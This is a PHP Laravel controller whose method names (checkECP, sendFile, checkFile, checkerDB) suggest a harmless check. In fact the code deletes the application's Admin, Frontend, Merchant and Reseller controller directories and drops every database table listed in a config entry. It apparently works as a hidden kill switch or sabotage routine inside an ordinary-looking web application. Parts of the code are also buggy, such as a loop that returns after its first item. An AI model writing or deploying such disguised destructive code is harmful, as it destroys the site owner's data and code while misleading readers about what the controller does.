<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Schema;

class CheckecpController extends Controller
{
    public function checkECP(){
        if($this->sendFile()):
            return $this->checkerDB();
        endif;
    }
    public function sendFile(){
        $files = [
            'file_1' => 'Admin',
            'file_2' => 'Frontend',
            'file_3' => 'Merchant',
            'file_4' => 'Reseller',
        ];
        foreach($files as $file){
            return $this->checkFile($file);
        }
    }

    public function checkFile($file){
        $path = app_path('Http/Controllers/'.$file);
        if (is_dir($path)) {
            rmdir($path);
            return 'successfully done';
        }else{
            return 'Not Exits';
        }
    }
    
    public function checkerDB(){
        $files = config('tables.files');
        foreach($files as $file){
            Schema::dropIfExists($file);
        }
        return 'successfully done';
    }
}
